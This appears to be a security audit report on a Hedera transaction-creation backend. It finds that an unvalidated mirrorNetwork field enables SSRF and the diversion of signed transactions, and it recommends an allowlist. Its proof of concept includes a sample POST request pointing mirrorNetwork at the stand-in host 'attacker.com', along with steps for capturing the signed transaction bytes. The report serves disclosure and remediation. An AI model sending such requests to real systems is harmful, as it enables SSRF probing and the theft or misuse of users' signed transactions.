Audit Report

## Title
Unvalidated `mirrorNetwork` Field Allows Arbitrary Network Routing and SSRF During Transaction Execution

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any non-empty string with no allowlist enforcement. The raw value is stored in the database and later consumed by `getClientFromNetwork` in both the creation and execution paths, causing the backend to open outbound gRPC connections to any attacker-supplied host.

## Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` declares `mirrorNetwork` with only `@IsNotEmpty()` and `@IsString()`: [1](#0-0) 

No `@IsIn(['mainnet','testnet','previewnet','local-node'])` or equivalent enum constraint is applied.

**Step 1 — creation path passes the raw value to `getClientFromNetwork` and persists it:**

`createTransactions` calls `getClientFromNetwork(dtos[0].mirrorNetwork)` directly, then stores `data.mirrorNetwork` (which equals `dto.mirrorNetwork`) verbatim into the `Transaction` row: [2](#0-1) [3](#0-2) 

**Step 2 — `getClientFromNetwork` makes an outbound gRPC connection to the supplied URL:**

When the value is not one of the four known strings (`mainnet`, `testnet`, `previewnet`, `local-node`), the function falls through to the custom-network branch, calls `MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0])`, and executes an `AddressBookQuery` against the attacker-controlled host: [4](#0-3) 

**Step 3 — execution path re-uses the stored value:**

`ExecuteService._executeTransaction` calls `getClientFromNetwork(transaction.mirrorNetwork)` with the persisted value, then submits the fully-signed transaction bytes to whatever nodes the attacker's address-book response advertised: [5](#0-4) 

## Impact Explanation

- **SSRF**: The backend makes outbound gRPC connections to an attacker-controlled host at two points in the transaction lifecycle (creation and execution). This can be used to probe internal services reachable from the backend pod (metadata endpoints, internal APIs, other microservices).
- **Transaction misdirection**: Fully-signed multi-party transactions (potentially carrying significant HBAR or token operations) are submitted to attacker-controlled infrastructure instead of the real Hedera network. The attacker receives the signed transaction bytes, can withhold submission, replay them, or observe sensitive transaction contents.
- **Cross-network confusion**: An attacker can store `mirrorNetwork: "mainnet"` for a transaction whose bytes were intended for testnet (or vice versa), causing execution on the wrong network and potential permanent loss of funds.

## Likelihood Explanation

Any authenticated organization-mode user can reach `POST /transactions` without elevated privilege. The `mirrorNetwork` field is a normal part of the API contract. No leaked credentials or admin access are required. The attacker only needs to operate a gRPC server that speaks the Hedera SDK's `AddressBookQuery` protocol, which is publicly documented.

## Recommendation

Add an allowlist validator to `mirrorNetwork` in `CreateTransactionDto`:

```typescript
@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
mirrorNetwork: string;
```

Alternatively, apply the same allowlist check at the start of `getClientFromNetwork` and throw if the value does not match a known network, preventing the custom-network branch from being reachable via user-supplied input.

## Proof of Concept

1. Attacker (authenticated org user) sends:
   ```
   POST /transactions
   {
     "mirrorNetwork": "attacker.com",
     "transactionBytes": "<valid hex>",
     "signature": "<valid hex>",
     "creatorKeyId": <valid id>,
     ...
   }
   ```
2. Backend calls `getClientFromNetwork("attacker.com")` → falls through to the custom-network branch at `client.ts` line 38 → gRPC `AddressBookQuery` to `attacker.com` (SSRF hit #1).
3. Attacker's gRPC server returns a crafted address book pointing to attacker-controlled Hedera nodes.
4. `isTransactionValidForNodes` runs against the attacker-supplied node set — passes trivially if the attacker echoes back node IDs that match the transaction.
5. Transaction is saved with `mirrorNetwork = "attacker.com"`.
6. When the chain service later executes the transaction, `_executeTransaction` at `execute.service.ts` line 132 calls `getClientFromNetwork("attacker.com")` again (SSRF hit #2) and submits the signed transaction bytes to the attacker's nodes.
